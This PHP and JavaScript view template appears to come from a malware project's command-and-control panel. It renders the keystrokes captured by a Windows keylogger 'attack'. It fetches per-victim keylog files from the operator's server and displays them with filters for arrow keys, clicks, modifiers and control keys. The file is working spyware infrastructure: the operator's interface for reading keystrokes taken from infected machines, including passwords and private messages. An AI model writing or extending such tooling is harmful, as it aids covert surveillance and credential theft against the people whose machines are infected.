<?php

global $timezone;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $attack */

/** @var User $user */

use Kelvinho\Virus\Singleton\BackgroundAttacks;
use Kelvinho\Virus\User\User;
use function Kelvinho\Virus\map;

BackgroundAttacks::js($attack); ?>
<script>
    class Event extends BaseEvent {
        constructor(unixTime, name, displayTime) {
            super();
            this.unixTime = unixTime;
            this.url = "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=keys-"; ?>" + unixTime + ".txt";
            this.name = name ?? "";
            this.displayTime = displayTime;
            this.response = null;
        }

        /**
         * Renders the HTML content
         *
         * @param {boolean} forStream Whether for stream events or not
         * @returns {string}
         */
        renderContent(forStream) {
            return this.renderContentWithCheckValues(forStream, [true, true, true, true, true]);
        }

        /**
         *
         * @param {boolean} forStream Rendering for stream events
         * @param {Array.<boolean>} checks
         * @returns {string}
         */
        renderContentWithCheckValues(forStream, checks) {
            const self = this;
            if (self.response === null) $.ajax({
                url: self.url,
                async: false,
                success: response => self.response = response
            });
            let formattedResponse = self.response + "";
            if (!checks[0]) formattedResponse = formattedResponse.replace(/\[left]/g, "").replace(/\[up]/g, "").replace(/\[right]/g, "").replace(/\[down]/g, "");
            if (!checks[1]) formattedResponse = formattedResponse.replace(/\[left click]/g, "").replace(/\[right click]/g, "").replace(/\[middle click]/g, "");
            if (!checks[2]) formattedResponse = formattedResponse.replace(/\[alt]/g, "").replace(/\[shift]/g, "").replace(/\[ctrl]/g, "");
            if (!checks[3]) formattedResponse = formattedResponse.replace(/\[tab]/g, "").replace(/\[pgup]/g, "").replace(/\[pgdn]/g, "");
            if (!checks[4]) formattedResponse = formattedResponse.replace(/\[back]/g, "").replace(/\[enter]/g, "").replace(/\[esc]/g, "").replace(/\[caps]/g, "");
            const onChange = forStream ? ` onchange="context.streamChange()"` : ` onchange="context.savedChange()"`;
            return `<div style="padding: 8px 8px 15px;">` + [[0, "Arrow keys"], [1, "Mouse clicks"], [2, "Modifier (alt, shift, ctrl)"], [3, "Movement (tab, pgup, pgdn)"], [4, "Control (back, enter, esc, locks)"]].map(
                element => `<input id = "` + (forStream ? "stream" : "saved") + `Check` + element[0] + `" class="w3-check" type="checkbox" ` + (checks[element[0]] ? "checked" : "") + onChange + ` style="margin: 0 5px;"><label for="` + (forStream ? "stream" : "saved") + `Check` + element[0] + `">` + element[1] + `</label>`
            ).join("") + `</div>
                    <textarea class="w3-input w3-border" rows="35">` + formattedResponse + `</textarea>`;
        }

        export() {
            return JSON.stringify({"name": this.name});
        }

        getName() {
            return this.name;
        }

        setName(name) {
            this.name = name;
        }

        getDisplayTime() {
            return this.displayTime;
        }

        addContext(context) {
            super.addContext(context);
            this.context = context;
        }
    }

    /** @type {Object.<number, BaseEvent>} */
    const events = {<?php echo implode(", ", map($attack->getEvents(), fn($name, int $unixTime) => "$unixTime: new Event($unixTime, \"$name\", \"" . $timezone->display($user->getTimezone(), $unixTime) . "\")")); ?>};
    const context = setupBackgroundAttacksJs(events, [<?php echo implode(", ", $attack->getSavedEvents()); ?>].reverse());

    context.streamChange = () => {
        /** @type {Event} */ const currentEvent = context.allEvents[context.streamEvents.activeEventTime];
        const streamMap = $("#streamMap");
        const checks = [0, 1, 2, 3, 4].map(number => $("#streamCheck" + number).is(":checked"));
        streamMap.html("");
        streamMap.append(currentEvent.renderContentWithCheckValues(true, checks));
    };
    context.savedChange = () => {
        /** @type {Event} */ const currentEvent = context.allEvents[context.savedEvents.activeEventTime];
        const savedMap = $("#savedMap");
        const checks = [0, 1, 2, 3, 4].map(number => $("#savedCheck" + number).is(":checked"))
        savedMap.html("");
        savedMap.append(currentEvent.renderContentWithCheckValues(false, checks));
    };
</script>
